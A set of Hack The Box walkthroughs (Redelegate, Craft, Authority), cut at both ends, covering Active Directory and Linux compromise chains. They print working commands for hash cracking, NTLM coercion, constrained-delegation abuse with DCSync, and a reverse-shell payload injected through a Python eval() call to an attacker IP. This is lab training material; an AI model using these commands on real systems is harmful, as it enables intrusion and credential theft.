Friday 18th October | 11.30 - 13.30 - 7 attendees "Weak Passwords" - Why "SeasonYear!" is not a good password The CyberAudit.txt file references an audit conducted in October 2024, making passwords such as Fall2024! or Autumn2024! good candidates.
To perform offline password cracking, we first extract the KeePass hash:
└─$ keepass2john Shared.kdbx > keepass.hash Since KeePass2John prepends the filename (e.g., Shared.kdbx:$keepass$...), remove the filename before supplying the hash to Hashcat.
Using Hashcat with mode 13400 (KeePass 2) and a custom wordlist containing seasonal password combinations quickly recovers the master password:
└─$ hashcat -m 13400 keepass.hash custom_wordlist.txt The recovered password is:
Fall2024! With the master password recovered, install KeePass 2 and open the database:
└─$ sudo apt update && sudo apt install keepass2 -y └─$ keepass2 Shared.kdbx After authenticating with the recovered password, the KeePass database reveals different saved credentials.
MSSQL Enumeration # Testing the recovered credentials against SMB was unsuccessful but the credentials of SQLGuest worked for the MSSQL service using the –local-auth flag which allows login to the service as the MSSQL native account:
└─$ nxc mssql 10.129.234.50 -u 'SQLGuest' -p 'zDPBpaF4FywlqIv11vii' --local-auth MSSQL 10.129.234.50 1433 DC [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl) (EncryptionReq:False) MSSQL 10.129.234.50 1433 DC [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii We can logged in to the database with impacket-mssqlclient:
└─$ impacket-mssqlclient redelegate.vl/SQLGuest:'zDPBpaF4FywlqIv11vii'@10.129.234.50 Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'master'. [*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000) [!] Press help for extra shell commands SQL (SQLGuest guest@master)> We successfully login to the database service but there is no special database to enumerate nor are there any users that our current account can impersonate. We can steal the NTLMv2 challenge-response hash of the service account currently running the service via UNC path of our attacking machine and try to crack the hash if the account is configured with a weak password. First start Responder to catch the NTLMv2 challenge-response hash:
└─$ sudo responder -I tun0 Make sure the SMB server of Responder is running and then use the following UNC path listing command on the SQL Server:
SQL (SQLGuest guest@master)> xp_dirtree \\10.10.15.86\share Save the captured hash to a file and crack it with Hashcat using mode 5600:
└─$ hashcat -m 5600 sql_svcNTLMv2Hash.txt /usr/share/wordlists/rockyou.txt The hash did not crack using rockyou.txt or any of the credentials recovered from the KeePass database. MSSQL service also allows us to perform rid brute-forcing to find domain accounts and this we can do with Netexec or Metasploit. Trying with Netexec didn’t work for me so I went with Metasploit auxiliary module method:
msf > use auxiliary/admin/mssql/mssql_enum_domain_accounts The output revealed domain user accounts which we can save in a file and check for password reuse with the credentials we collected until now:
└─$ nxc smb 10.129.234.50 -u users.txt -p creds.txt From the output, we found a user account “Marie.Curie” with the password “Fall2024!”. As we have domain credentials, we can check if there is any interesting SMB share accessible now:
└─$ nxc smb 10.129.234.50 -u 'Marie.Curie' -p 'Fall2024!' --shares SMB 10.129.234.50 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:None) (Null Auth:True) 10.129.234.50 445 DC [+] redelegate.vl\Marie.Curie:Fall2024! SMB 10.129.234.50 445 DC [*] Enumerated shares SMB 10.129.234.50 445 DC Share Permissions Remark SMB 10.129.234.50 445 DC ----- ----------- ------ SMB 10.129.234.50 445 DC ADMIN$ Remote Admin SMB 10.129.234.50 445 DC C$ Default share SMB 10.129.234.50 445 DC IPC$ READ Remote IPC SMB 10.129.234.50 445 DC NETLOGON READ Logon server share SMB 10.129.234.50 445 DC SYSVOL READ Logon server share There is no non-default SMB share and the ones we have read access to also don’t contain anything useful.
BloodHound Analysis # We can move towards collecting the domain information with BloodHound for visual analysis:
└─$ bloodhound-ce-python -c all -u 'Marie.Curie' -p 'Fall2024!' -d 'redelegate.vl' -ns 10.129.234.50 --dns-tcp --zip --dns-timeout 90 Analysing the privileges of our current user “Marie.Curie” revealed that she has ForceChangePassword over 6 domain user accounts.
We will reset the password of “HELEN.FROST” as this account is the only one present in the “Remote Management Users” group allowing us to log in to the host using WinRM:
To change the password of Helen.Frost:
└─$ bloodyad -u 'Marie.Curie' -p 'Fall2024!' -d redelegate.vl -i 10.129.234.50 set password 'HELEN.FROST' 'Helen@123' [+] Password changed successfully! After resetting the password, we can login using evil-wirnm:
└─$ evil-winrm -i 10.129.234.50 -u Helen.Frost -p 'Helen@123' The user.txt can be found in “C:\Users\Helen.Frost\Desktop"
Escalating Privileges # Reviewing the privileges of other domain accounts that Marie.Curie has ForceChangePassword on didn’t reveal anything useful.
Identifying Delegation Abuse # Checking the system privileges of the “Helen.Frost” user revealed following output:
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================================================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeEnableDelegationPrivilege Enable computer and user accounts to be trusted for delegation Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled The “SeEnableDelegationPrivilege” is an important privilege as it allows users to configure domain accounts for Constrained or Unconstrained Delegation. The two are defined as:
Constrained Delegation: Allows a service to impersonate users only to specific services defined in the msDS-AllowedToDelegateTo attribute.
Unconstrained Delegation: Allows a service to impersonate users to any service without restrictions.
We have the possibility of performing the above two mentioned delegation attacks as the Helen.Frost also has GenericAll rights on a computer account:
For Unconstrained Delegation, we have following requirements:
Control over an account configured for Unconstrained Delegation (TRUSTED_FOR_DELEGATION). Control over the account’s credentials (password, NTLM hash, or AES key). The delegated account has a valid SPN. Ability to modify DNS so the SPN hostname resolves to your attacker machine. An attacker machine running krbrelayx. Ability to coerce the target to authenticate. The target authenticates using Kerberos (not NTLM). Almost all of these requirements are satisfied except the ability to modify DNS which results in the following error when we try to add a DNS entry pointing to our attacking machine:
└─$ dnstool -u 'redelegate\Helen.Frost' -p 'Helen@123' -r roguecomputer.redelegate.vl -d 10.10.15.86 --action add 10.129.234.50 [-] Connecting to host... [-] Binding to host [+] Bind OK [-] Adding new record [!] LDAP operation failed. Message returned from server: insufficientAccessRights 00000005: SecErr: DSID-03152E29, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0 Instead, we will abuse Constrained Delegation which has following requirements:
Control over a user or computer account. The account has a valid SPN. The account has the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION flag enabled. The target service SPN is present in the account’s msDS-AllowedToDelegateTo attribute. Control over the account’s credentials (password, NTLM hash, or AES key). A target user that is not marked as “Account is sensitive and cannot be delegated.” Ability to request Kerberos S4U2Self and S4U2Proxy tickets (e.g., using getST.py or Rubeus). We do not have DNS modifications requirement here and all of the above requirements are satisfied. As we have control over the “FS01” computer account and we have SeEnableDelegationPrivilege, we can set the required flag and attribute on the target.
Configuring Constrained Delegation # To enable S4U2Self, we first set the TRUSTED_TO_AUTH_FOR_DELEGATION flag on the computer account:
└─$ bloodyad -u 'Helen.Frost' -p 'Helen@123' -d 'redelegate.vl' -i '10.129.234.50' add uac 'FS01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION [+] ['TRUSTED_TO_AUTH_FOR_DELEGATION'] property flags added to FS01$'s userAccountControl To verify the change, we need to see the values of UAC of the computer account object:
└─$ bloodyad -u 'Helen.Frost' -p 'Helen@123' -d 'redelegate.vl' -i '10.129.234.50' get object 'FS01$' --attr userAccountControl distinguishedName: CN=FS01,CN=Computers,DC=redelegate,DC=vl userAccountControl: WORKSTATION_TRUST_ACCOUNT; TRUSTED_TO_AUTH_FOR_DELEGATION The output confirmed that the flag is successfully added. To configure the constrained delegation, we can add any SPN service from the target (DC) to the computer account’s attribute “msDS-AllowedToDelegateTo” so that the computer account can impersonate users to that DC service. We add the LDAP SPN so the computer account can later impersonate users to LDAP and perform DCSync:
└─$ bloodyad -u 'Helen.Frost' -p 'Helen@123' -d 'redelegate.vl' -i '10.129.234.50' set object 'FS01$' msDS-AllowedToDelegateTo -v LDAP/DC.redelegate.vl [+] FS01$'s msDS-AllowedToDelegateTo has been updated We can confirm the attribute modification with:
└─$ bloodyad -u 'Helen.Frost' -p 'Helen@123' -d 'redelegate.vl' -i '10.129.234.50' get object 'FS01$' --attr msDS-AllowedToDelegateTo distinguishedName: CN=FS01,CN=Computers,DC=redelegate,DC=vl msDS-AllowedToDelegateTo: LDAP/DC.redelegate.vl Now we need to reset the password of the computer account as we will use it when we perform the S4U2Self and S4U2Proxy attack with impacket-getST:
└─$ bloodyad -u 'Helen.Frost' -p 'Helen@123' -d 'redelegate.vl' -i '10.129.234.50' set password 'FS01$' 'Fs01@123' [+] Password changed successfully! S4U Attack and DCSync # It’s time to ask the TGS of the account we want to impersonate to the LDAP service. As the Domain Admin’s account is marked as sensitive, we cannot impersonate it to the target service. There is another user who is a member of the “Domain Admins” group and is not marked as sensitive.
As this user has the same privileges the Domain Admin has, we can successfully impersonate it to the target service:
└─$ impacket-getST redelegate.vl/'FS01$':'Fs01@123' -spn 'LDAP/DC.redelegate.vl' -impersonate 'RYAN.COOPER' -dc-ip 10.129.234.50 Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies [-] CCache file is not found. Skipping... [*] Getting TGT for user [*] Impersonating RYAN.COOPER [*] Requesting S4U2self [*] Requesting S4U2Proxy [*] Saving ticket in RYAN.COOPER@LDAP_DC.redelegate.vl@REDELEGATE.VL.ccache We can set the ticket in the environment variable “KRB5CCNAME” to use with impacket tools:
└─$ export KRB5CCNAME=RYAN.COOPER@LDAP_DC.redelegate.vl@REDELEGATE.VL.ccache Now to perform a DCSync attack and get the Administrator’s NT hash:
└─$ impacket-secretsdump redelegate.vl/RYAN.COOPER@DC.redelegate.vl -k -no-pass -just-dc-user Administrator With the NT hash, we can login to the target as Administrator using evil-winrm:
└─$ evil-winrm -i 10.129.234.50 -u Administrator -H '<NT-Hash>' The root.txt can be found in the Administrator’s Desktop
summary: Chain anonymous FTP, KeePass credential recovery, MSSQL abuse, password reuse, and constrained delegation to achieve Domain Admin.
title: Redelegate Machine Writeup | HTB

content:
Summary # Craft is a medium-difficulty Linux machine that demonstrates how exposed source code, insecure coding practices, and poor secret management can be chained to achieve full system compromise. The attack begins by enumerating a public Gogs repository, where commit history reveals hardcoded credentials and a vulnerable use of Python’s eval() on user-controlled input, leading to remote code execution inside a Docker container. From the container, database credentials are leveraged to recover additional user credentials, granting access to a private repository containing an encrypted SSH key. Finally, misconfigured HashiCorp Vault SSH OTP authentication is abused to generate a one-time password for the root account, resulting in complete privilege escalation.
Reconnaissance # Rustscan # We start with Rustscan to quickly identify all the open ports from the total of 65535 possible ports.
└─$ rustscan -a 10.129.11.193 -r 0-65535 PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 443/tcp open https syn-ack ttl 62 6022/tcp open x11 syn-ack ttl 62 Nmap # After identifying the open ports using Rustscan, we will perform detailed enumeration of each open port using Nmap:
└─$ nmap 10.129.11.193 -T4 -sC -sV -p 22,443,6022 Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-04 20:53 +0500 Nmap scan report for 10.129.11.193 Host is up (0.094s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA) | 256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA) |_ 256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519) 443/tcp open ssl/http nginx 1.15.8 |_http-server-header: nginx/1.15.8 | tls-nextprotoneg: |_ http/1.1 |_http-title: About |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US | Not valid before: 2019-02-06T02:25:47 |_Not valid after: 2020-06-20T02:25:47 | tls-alpn: |_ http/1.1 6022/tcp open ssh Golang x/crypto/ssh server (protocol 2.0) | ssh-hostkey: |_ 2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Initial Access # Application Enumeration # Inspecting the HTTPS application on port 443 reveals a static “About” page. The navigation elements point to two external subdomains: api.craft.htb and gogs.craft.htb. To interact with these virtual hosts, we update our local /etc/hosts file:
└─$ sudo nano /etc/hosts 10.129.11.193 craft.htb api.craft.htb gogs.craft.htb Before we moved to the subdomains, we fuzzed the current site for hidden directories with ffuf but nothing useful was found:
└─$ ffuf -u 'https://10.129.11.193/FUZZ' -ic -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50 -fc 404 The api.craft.htb website shows a swagger API with various API endpoints
The gogs.craft.htb website shows a self-hosted Git services application namely Gogs.
We start enumerating the public repositories in the Gogs instance as the Sign In page doesn’t allow to register a new account. Looking in the Explore tab, there is a public repository named craft-api. After enumerating all the files in the repository thoroughly, we find credentials of a user Dinesh in a commit history for a file test.py. Using the credentials, we can login to the Gogs as that user.
Exploiting the eval() Vulnerability # After login, reviewing the other commits for a file brew.py reveals the introduction of a critical vulnerability.
The user input from the abv parameter is passed directly into a dangerous eval() function to verify if the value is a decimal below 1.0. Since user-controlled input is evaluated as Python code, this results in a Remote Code Execution (RCE) vulnerability via the POST /api/brew/ endpoint in the api subdomain.
We can authenticate and get a token via the “GET /auth/login” API endpoint. With the POST /bew/ endpoint, we can send a request to create an entry for a new brew and then copy the POST request structure after we have sended the initial POST request. The request will eventually fail because we have not set the authentication token in the header and the Swagger UI does not provide a way to include the required authentication header in the request.
After adding the required authentication header to the request locally, we can use curl to send it without Using the following curl command, we can obtain a reverse shell using python payload exploiting the eval function:
└─$ curl -X POST "https://api.craft.htb/api/brew/" \ -H "accept: application/json" \ -H "Content-Type: application/json" \ -H "X-Craft-API-Token: <API-TOKEN>" \ -d '{"id":100,"brewer":"test","name":"test","style":"Dark","abv":"2"}' \ --insecure In the response, we get an error that the value of abv must be less than 1. So this tells that the vulnerable code is still present in the website’s source code file and we can exploit it to get a reverse shell. We will use python payload in the abv parameter’s value which will send us a reverse shell after it gets executed by the eval() function:
└─$ curl -X POST "https://api.craft.htb/api/brew/" \ -H "accept: application/json" \ -H "Content-Type: application/json" \ -H "X-Craft-API-Token: <API-TOKEN>" \ -d '{"id":100,"brewer":"test","name":"test","style":"Dark","abv":"0 or exec(\"import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\\\"<ATTACKER-IP>\\\",9090)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])\") or 0"}' \ --insecure Make sure to start the netcat listener first before executing the above payload request:
└─$ netcat -lvnp 9090 Looking back in the netcat listener, we get a shell as root user.
Post-Exploitation Enumeration # After checking the hostname and the .dockerenv in the / directory, we find that we are in a docker container and the api website is running from this container. There is not much to enumerate in the container except the API website’s application files that we can read now.
In the current directory, the dbtest.py script is retrieving credentials of MySQL from a settings.py file in the craft_api directory and executing a hardcoded SQL query. We can run it with “python3 dbtest.py” and it outputs the query results which shows that the docker container can interact with the MySQL database. Using the credentials, we can enumerate what other databases and tables are present in the MySQL.
We can’t use nano reliably in the reverse shell connection to edit the dbtest.py file to change the SQL query for performing the database enumeration. For this reason, we utilize Python inline scripts to manually enumerate the database. First of all, to query all the databases, we can use command:
python -c "import pymysql; conn=pymysql.connect(host='db',user='craft',password='qLGockJ6G2J75O',db='craft'); cur=conn.cursor(); cur.execute('SHOW DATABASES'); print(cur.fetchall()); conn.close()" The query returns two databases: craft and information_schema. Since information_schema is a standard MySQL system database, we continue enumerating the craft database.
python -c "import pymysql; conn=pymysql.connect(host='db',user='craft',password='qLGockJ6G2J75O',db='craft'); cur=conn.cursor(); cur.execute('SHOW TABLES'); print(cur.fetchall()); conn.close()" The output shows “brew” & “user” tables are present. To describe the schema of user table and see what columns it contain:
python -c "import pymysql; conn=pymysql.connect(host='db',user='craft',password='qLGockJ6G2J75O',db='craft'); cur=conn.cursor(); cur.execute('DESCRIBE user'); print(cur.fetchall()); conn.close()" The output reveals 3 columns as “id”, “username” and “password” are present. We will dump the content of the latter 2 columns in order to get credentials if there is any:
python -c "import pymysql; conn=pymysql.connect(host='db',user='craft',password='qLGockJ6G2J75O',db='craft'); cur=conn.cursor(); cur.execute('SELECT username,password FROM user'); print(cur.fetchall()); conn.close()" The query shows credentials for the 3 users from the Gogs website as:
(('dinesh', '4aUh0A8PbVJxgd'), ('ebachman', 'llJ77D8QFkLPQB'), ('gilfoyle', 'ZEU3N8WNM2rh4T')) We already have the credentials of dinesh so we can try the other two. For SSH access on port 22 and 6022, the credentials of all 3 users failed but on the Gogs website, credentials of “gilfoyle” worked successfully and we find a private repository “craft-infra”.
The repo has a .ssh folder containing public and private key pairs. We can copy the private key in order to authenticate as that user on the SSH service:
└─$ chmod 600 id_rsa └─$ ssh -i id_rsa gilfoyle@10.129.11.193 Authenticating with the key asks for a password because the key is encrypted. Trying the Gogs login creds of gilfoyle worked and we successfully log in to the target machine.
The flag user.txt is present in the home directory of gilfoyle.
Escalating Privileges # Vault Enumeration # In the hidden files in Gilfoyle’s home directory, we find a vault-token file containing some token string. Enumerating the system we find an environment variable “VAULT_ADDR=https://vault.craft.htb:8200/”.
The output of linpeas.sh script also flags the hidden token file with heading “Vault-SSH”. Searcing for the keyword we find that Vault-SSH is a secrets engine of a SSH managing application from HashiCorp Vault. Researching the application further reveals that:
HashiCorp Vault’s SSH secrets engine replaces long-lived SSH keys with short-lived credentials. Depending on the configuration, it can issue either signed SSH certificates or one-time passwords (OTPs) for authentication.
Looking at the configuration setups in the documentation revealed that it can either be setup to authenticate users via SSH key signed certificates or OTP.
Abusing Vault SSH OTP # The current configuration of the system to see whether it allows SSH signed certificates or OTP can be viewed using:
gilfoyle@craft:~$ vault list ssh/roles Keys ---- root_otp From here it seems like OTP is configured which we can further see details as:
gilfoyle@craft:~$ vault read ssh/roles/root_otp Key Value --- ----- allowed_users n/a cidr_list 0.0.0.0/0 default_user root exclude_cidr_list n/a key_type otp port 22 In the above configuration output, the default_user that users can authenticate as is set to root. To request the OTP as root for the current system IP:
gilfoyle@craft:~$ vault write ssh/creds/root_otp ip=10.129.11.193 Key Value --- ----- lease_id ssh/creds/root_otp/e9930e51-4fdc-53d7-85e8-b02e4a2e1daf lease_duration 768h lease_renewable false ip 10.129.11.193 key 625ffde7-e21a-fc1b-9c44-e4c588795064 key_type otp port 22 username root The OTP is given as the value of “key” parameter which we can use to authenticate as root when doing SSH login in place of password. To do so, we can escalate to root from the current user shell via:
gilfoyle@craft:~$ ssh root@localhost When it asks for the password, provide the key and it will login as root user successfully.
The root.txt can be found in the root directory of root user.
summary: Source code review leads to Python eval() RCE in a Docker container, followed by credential discovery and HashiCorp Vault SSH OTP for root.
title: Craft Machine Writeup | HTB

content:
Summary # Authority is a medium-difficulty Active Directory machine that demonstrates how multiple seemingly minor weaknesses can be chained into a complete domain compromise. The attack begins with an anonymously accessible SMB share containing Ansible deployment files, leading to the recovery of encrypted Ansible Vault secrets. After cracking the vault password, valid credentials are obtained for the PWM Password Self Service application. A misconfigured LDAP testing feature is then abused to capture LDAP proxy credentials in cleartext, providing an initial foothold on the domain. Finally, the compromise is escalated by exploiting a vulnerable Active Directory Certificate Services (AD CS) certificate template (ESC1) together with the default MachineAccountQuota setting, resulting in full administrative control over the domain.
Reconnaissance # Rustscan # We start with Rustscan to quickly identify all the open ports from the total of 65535 possible ports.
└─$ rustscan -a 10.129.11.43 -r 0-65535 PORT STATE SERVICE REASON 53/tcp open domain syn-ack ttl 127 80/tcp open http syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 389/tcp open ldap syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 5985/tcp open wsman syn-ack ttl 127 8443/tcp open https-alt syn-ack ttl 127 9389/tcp open adws syn-ack ttl 127 47001/tcp open winrm syn-ack ttl 127 49664/tcp open unknown syn-ack ttl 127 49665/tcp open unknown syn-ack ttl 127 49666/tcp open unknown syn-ack ttl 127 49667/tcp open unknown syn-ack ttl 127 49673/tcp open unknown syn-ack ttl 127 49690/tcp open unknown syn-ack ttl 127 49691/tcp open unknown syn-ack ttl 127 49693/tcp open unknown syn-ack ttl 127 49694/tcp open unknown syn-ack ttl 127 49708/tcp open unknown syn-ack ttl 127 49714/tcp open unknown syn-ack ttl 127 58398/tcp open unknown syn-ack ttl 127 Nmap # After identifying the open ports using Rustscan, we will perform detailed enumeration of each open port using Nmap:
└─$ nmap 10.129.11.43 -T4 -sC -sV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8443,9389,47001 Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-03 10:50 +0500 Nmap scan report for 10.129.11.43 Host is up (0.24s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: IIS Windows Server 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2026-07-03 09:50:17Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name) |_ssl-date: 2026-07-03T09:51:10+00:00; +3h59m59s from scanner time. | ssl-cert: Subject: | Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB | Not valid before: 2022-08-09T23:03:21 |_Not valid after: 2024-08-09T23:13:21 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name) |_ssl-date: 2026-07-03T09:51:09+00:00; +4h00m00s from scanner time. | ssl-cert: Subject: | Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB | Not valid before: 2022-08-09T23:03:21 |_Not valid after: 2024-08-09T23:13:21 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name) |_ssl-date: 2026-07-03T09:51:09+00:00; +3h59m59s from scanner time. | ssl-cert: Subject: | Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB | Not valid before: 2022-08-09T23:03:21 |_Not valid after: 2024-08-09T23:13:21 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name) |_ssl-date: 2026-07-03T09:51:09+00:00; +4h00m00s from scanner time. | ssl-cert: Subject: | Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB | Not valid before: 2022-08-09T23:03:21 |_Not valid after: 2024-08-09T23:13:21 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 8443/tcp open ssl/http Apache Tomcat (language: en) | ssl-cert: Subject: commonName=172.16.2.118 | Not valid before: 2026-07-01T09:45:41 |_Not valid after: 2028-07-02T21:24:05 | tls-alpn: |_ h2 |_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1). |_ssl-date: TLS randomness does not represent time 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2026-07-03T09:51:01 |_ start_date: N/A | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required |_clock-skew: mean: 3h59m59s, deviation: 0s, median: 3h59m59s To sync the system time with the DC:
└─$ sudo ntpdate 10.129.11.43 To communicate properly with the Domain Controller, we will add following entries to our /etc/hosts file:
└─$ sudo nano /etc/hosts 10.129.11.43 authority.htb authority.authority.htb authority Initial Access # Web Application Enumeration # We start by enumerating the HTTP applications at ports 80 and 8443. Port 80 shows a default IIS server landing page.
As the IIS page did not reveal any useful functionality, directory brute forcing was performed to identify hidden applications or administrative interfaces, but nothing useful was found:
└─$ ffuf -u 'http://10.129.11.43/FUZZ' -ic -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50 -fc 404 Moving to the https application on port 8443, the website redirects us to a login page of PWM Password Self Service.
Attempting common default credentials such as admin:admin was unsuccessful and showed an error notice. The error showed that when the application tried to connect to the configured LDAP url “ldaps://authority.authority.htb:636” as the proxy user “svc_ldap”, the connection failed.
Checking the two buttons below the Sign In option redirects to another login page that is just asking for a password and no username. From the same page, previous authentication table data revealed a username “svc_pwn” in its Distinguished Name (DN) format as “CN=svc_pwm,CN=Users,DC=htb,DC=corp (default)”.
So far there is not much for us to enumerate further in the web application.
SMB Share Exploitation # As we don’t have the domain credentials for any user, we can check if null or anonymous authentication is allowed and whether we can access any SMB share. We can use any random username and empty password in order to check null authentication:
└─$ nxc smb 10.129.11.43 -u 'anonymous' -p '' --shares SMB 10.129.11.43 445 AUTHORITY [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:None) (Null Auth:True) SMB 10.129.11.43 445 AUTHORITY [+] authority.htb\anonymous: (Guest) SMB 10.129.11.43 445 AUTHORITY [*] Enumerated shares SMB 10.129.11.43 445 AUTHORITY Share Permissions Remark SMB 10.129.11.43 445 AUTHORITY ----- ----------- ------ SMB 10.129.11.43 445 AUTHORITY ADMIN$ Remote Admin SMB 10.129.11.43 445 AUTHORITY C$ Default share SMB 10.129.11.43 445 AUTHORITY Department Shares SMB 10.129.11.43 445 AUTHORITY Development READ SMB 10.129.11.43 445 AUTHORITY IPC$ READ Remote IPC SMB 10.129.11.43 445 AUTHORITY NETLOGON Logon server share SMB 10.129.11.43 445 AUTHORITY SYSVOL Logon server share On one non-default SMB share, we have READ access so we can try to connect to the share with smbclient and see what it contains:
└─$ smbclient //10.129.11.43/Development -N After checking the available content, we find 4 directories in “Automation/Ansible” as ADCS, LDAP, PWM and SHARE. Each contains subdirectories and files. Checking them one by one inside the SMB share is a bit of pain so we will download all the data to our system and look through them locally. For downloading, we will use smbget tool:
└─$ smbget -U anonymous% smb://10.129.11.43/Development/ --recursive After downloading the share, the directory structure looks like this:
./Automation └── Ansible ├── ADCS │ ├── defaults │ ├── meta │ ├── molecule │ │ └── default │ ├── tasks │ ├── templates │ └── vars ├── LDAP │ ├── defaults │ ├── files │ ├── handlers │ ├── meta │ ├── tasks │ ├── templates │ └── vars ├── PWM │ ├── defaults │ ├── handlers │ ├── meta │ ├── tasks │ └── templates └── SHARE └── tasks Cracking Ansible Vault Secrets # Ansible is an automation tool that uses playbooks to configure systems. Finding these playbooks implies configuration data or deployment secrets might be exposed in plaintext or encrypted vaults.
Since the downloaded files contain several Ansible playbooks, we begin reviewing each role individually, looking for credentials, deployment scripts, or configuration files containing sensitive information. We find some tomcat and winrm plaintext credentials but neither of them worked for the domain or the PWM login pane. Ansible roles commonly store configuration values in defaults/main.yml. Discovering encrypted Ansible Vault entries suggests that sensitive credentials are being deployed automatically and may be recoverable if the vault password can be cracked.
<...SNIP...> pwm_admin_login: !vault | $ANSIBLE_VAULT;1.1;AES256 32666534386435366537653136663731633138616264323230383566333966346662313161326239 6134353663663462373265633832356663356239383039640a346431373431666433343434366139 35653634376333666234613466396534343030656165396464323564373334616262613439343033 6334326263326364380a653034313733326639323433626130343834663538326439636232306531 3438 pwm_admin_password: !vault | $ANSIBLE_VAULT;1.1;AES256 31356338343963323063373435363261323563393235633365356134616261666433393263373736 3335616263326464633832376261306131303337653964350a363663623132353136346631396662 38656432323830393339336231373637303535613636646561653637386634613862316638353530 3930356637306461350a316466663037303037653761323565343338653934646533663365363035 6531 ldap_uri: ldap://127.0.0.1/ ldap_base_dn: "DC=authority,DC=htb" ldap_admin_password: !vault | $ANSIBLE_VAULT;1.1;AES256 63303831303534303266356462373731393561313363313038376166336536666232626461653630 3437333035366235613437373733316635313530326639330a643034623530623439616136363563 34646237336164356438383034623462323531316333623135383134656263663266653938333334 3238343230333633350a646664396565633037333431626163306531336336326665316430613566 3764 Researching Ansible Vault revealed that sensitive variables are encrypted using AES and require the vault password for decryption. Because we lacked the required credentials to decrypt them, we searched for ways to crack the vault password and found a pentesting cheat sheet at ExploitNotes. Using john’s ansible2john script, we can extract the hashes from these encrypted blobs and then run those hashes through a cracking tool like John or Hashcat. To get the hashes, we need to save each of them in a separate file in the way that their spaces from the left side are removed:
